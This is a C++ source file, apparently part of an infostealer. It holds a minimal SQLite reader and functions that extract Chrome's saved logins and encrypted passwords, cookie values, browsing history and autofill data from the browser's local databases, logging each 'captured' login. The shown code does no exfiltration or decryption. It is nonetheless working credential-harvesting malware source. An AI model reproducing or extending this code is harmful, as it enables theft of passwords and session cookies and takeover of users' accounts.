#include "sqlite_minimal.h"
#include "logger/file_logger.h"
#include <windows.h>
#include <cstring>

#define SQLITE_HEADER_SIZE 100
#define SQLITE_BTREE_LEAF_TABLE 0x0D

bool MinimalSQLiteReader::LoadDatabase(const std::wstring& path) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    database.resize(static_cast<size_t>(fileSize.QuadPart));

    DWORD bytesRead;
    ReadFile(hFile, database.data(), (DWORD)database.size(), &bytesRead, NULL);
    CloseHandle(hFile);

    if (database.size() < SQLITE_HEADER_SIZE || 
        memcmp(database.data(), "SQLite format 3\0", 16) != 0) {
        return false;
    }

    page_size = (database[16] << 8) | database[17];
    if (page_size == 1) page_size = 65536;

    return true;
}

bool MinimalSQLiteReader::FindTableRootPage(const std::string& tableName, uint32_t& rootPage) {
    std::vector<std::vector<std::vector<uint8_t>>> masterRows;
    ParseBTreePage(1, masterRows);
    for (const auto& row : masterRows) {
        if (row.size() >= 5) {
            std::string name(row[1].begin(), row[1].end());
            if (name == tableName) {
                rootPage = (row[3][0] << 24) | (row[3][1] << 16) | (row[3][2] << 8) | row[3][3];
                return true;
            }
        }
    }
    return false;
}

std::vector<std::vector<std::vector<uint8_t>>> MinimalSQLiteReader::ExtractTable(uint32_t rootPage) {
    std::vector<std::vector<std::vector<uint8_t>>> rows;
    ParseBTreePage(rootPage, rows);
    return rows;
}

void MinimalSQLiteReader::ParseBTreePage(uint32_t pageNum, std::vector<std::vector<std::vector<uint8_t>>>& rows) {
    uint32_t offset = (pageNum - 1) * page_size;
    if (offset >= database.size()) return;

    uint8_t pageType = database[offset];
    if (pageType != SQLITE_BTREE_LEAF_TABLE) return;

    uint16_t numCells = (database[offset + 3] << 8) | database[offset + 4];
    for (uint16_t i = 0; i < numCells; i++) {
        uint16_t ptrOffset = offset + 8 + (i * 2);
        uint16_t cellOffset = (database[ptrOffset] << 8) | database[ptrOffset + 1];
        auto row = ParseCell(offset + cellOffset);
        if (!row.empty()) rows.push_back(row);
    }
}
std::vector<std::vector<uint8_t>> MinimalSQLiteReader::ParseCell(uint32_t offset) {
    std::vector<std::vector<uint8_t>> fields;

    uint64_t payloadSize = 0;
    offset += ReadVarint(offset, payloadSize);

    uint64_t rowid = 0;
    offset += ReadVarint(offset, rowid);

    uint64_t headerSize = 0;
    offset += ReadVarint(offset, headerSize);
    uint32_t headerStart = offset;

    std::vector<uint64_t> serialTypes;
    while (offset < headerStart + headerSize) {
        uint64_t type = 0;
        offset += ReadVarint(offset, type);
        serialTypes.push_back(type);
    }

    for (uint64_t type : serialTypes) {
        std::vector<uint8_t> field;
        if (type == 0) continue;
        else if (type >= 1 && type <= 6) {
            int size = type == 5 ? 6 : (type == 6 ? 8 : (int)type);
            field.insert(field.end(), database.begin() + offset, database.begin() + offset + size);
            offset += size;
        } else if (type >= 12 && type % 2 == 0) {
            int size = (int)((type - 12) / 2);
            field.insert(field.end(), database.begin() + offset, database.begin() + offset + size);
            offset += size;
        } else if (type >= 13 && type % 2 == 1) {
            int size = (int)((type - 13) / 2);
            field.insert(field.end(), database.begin() + offset, database.begin() + offset + size);
            offset += size;
        }
        fields.push_back(field);
    }

    return fields;
}

int MinimalSQLiteReader::ReadVarint(uint32_t offset, uint64_t& value) {
    value = 0;
    int bytes = 0;
    for (int i = 0; i < 9; i++) {
        if (offset + i >= database.size()) break;
        uint8_t byte = database[offset + i];
        if (i < 8) value |= (uint64_t)(byte & 0x7F) << (7 * i);
        else value |= (uint64_t)byte << 56;
        bytes++;
        if ((byte & 0x80) == 0) break;
    }
    return bytes;
}

// === Chrome Extractors ===

std::vector<std::tuple<std::string, std::string, std::vector<uint8_t>>>
ExtractChromePasswordsMinimal(const std::wstring& loginDataPath) {
    MinimalSQLiteReader reader;
    std::vector<std::tuple<std::string, std::string, std::vector<uint8_t>>> results;

    std::string pathStr(loginDataPath.begin(), loginDataPath.end());
    LogInfo(("Extracting Chrome passwords from: " + pathStr).c_str());

    if (!reader.LoadDatabase(loginDataPath)) {
        LogError(("Failed to load database: " + pathStr).c_str());
        return results;
    }

    uint32_t rootPage = 0;
    if (!reader.FindTableRootPage("logins", rootPage)) {
        LogError("Failed to find root page for 'logins'");
        return results;
    }

    auto rows = reader.ExtractTable(rootPage);
    for (const auto& row : rows) {
        if (row.size() >= 3) {
            std::string url(row[0].begin(), row[0].end());
            std::string username(row[1].begin(), row[1].end());
            std::vector<uint8_t> encryptedPassword = row[2];
            LogInfo(("Captured login for site: " + url + " user: " + username).c_str());
            results.emplace_back(url, username, encryptedPassword);
        }
    }

    return results;
}

std::vector<std::tuple<std::string, std::string, std::string>>
ExtractChromeCookiesMinimal(const std::wstring& cookieDbPath) {
    MinimalSQLiteReader reader;
    std::vector<std::tuple<std::string, std::string, std::string>> cookies;

    std::string pathStr(cookieDbPath.begin(), cookieDbPath.end());
    LogInfo(("Extracting Chrome cookies from: " + pathStr).c_str());

    if (!reader.LoadDatabase(cookieDbPath)) {
        LogError("Failed to load cookies DB");
        return cookies;
    }

    uint32_t rootPage = 0;
    if (!reader.FindTableRootPage("cookies", rootPage)) {
        LogError("No 'cookies' table found");
        return cookies;
    }

    auto rows = reader.ExtractTable(rootPage);
    for (const auto& row : rows) {
        if (row.size() >= 3) {
            std::string host(row[0].begin(), row[0].end());
            std::string name(row[1].begin(), row[1].end());
            std::string value(row[2].begin(), row[2].end());
            LogInfo(("Cookie: " + host + " | " + name).c_str());
            cookies.emplace_back(host, name, value);
        }
    }

    return cookies;
}

std::vector<std::tuple<std::string, int>>
ExtractChromeHistoryMinimal(const std::wstring& historyDbPath) {
    MinimalSQLiteReader reader;
    std::vector<std::tuple<std::string, int>> history;

    std::string pathStr(historyDbPath.begin(), historyDbPath.end());
    LogInfo(("Extracting Chrome history from: " + pathStr).c_str());

    if (!reader.LoadDatabase(historyDbPath)) {
        LogError("Failed to load history DB");
        return history;
    }

    uint32_t rootPage = 0;
    if (!reader.FindTableRootPage("urls", rootPage)) {
        LogError("No 'urls' table found");
        return history;
    }

    auto rows = reader.ExtractTable(rootPage);
    for (const auto& row : rows) {
        if (row.size() >= 2) {
            std::string url(row[0].begin(), row[0].end());
            int count = row[1].empty() ? 0 : row[1][0];
            LogInfo(("Visited: " + url).c_str());
            history.emplace_back(url, count);
        }
    }

    return history;
}

std::vector<std::tuple<std::string, std::string>>
ExtractChromeAutofillMinimal(const std::wstring& webDataPath) {
    MinimalSQLiteReader reader;
    std::vector<std::tuple<std::string, std::string>> autofill;

    std::string pathStr(webDataPath.begin(), webDataPath.end());
    LogInfo(("Extracting Chrome autofill from: " + pathStr).c_str());

    if (!reader.LoadDatabase(webDataPath)) {
        LogError("Failed to load autofill DB");
        return autofill;
    }

    uint32_t rootPage = 0;
    if (!reader.FindTableRootPage("autofill", rootPage)) {
        LogError("No 'autofill' table found");
        return autofill;
    }

    auto rows = reader.ExtractTable(rootPage);
    for (const auto& row : rows) {
        if (row.size() >= 2) {
            std::string name(row[0].begin(), row[0].end());
            std::string value(row[1].begin(), row[1].end());
            LogInfo(("Autofill: " + name).c_str());
            autofill.emplace_back(name, value);
        }
    }

    return autofill;
}
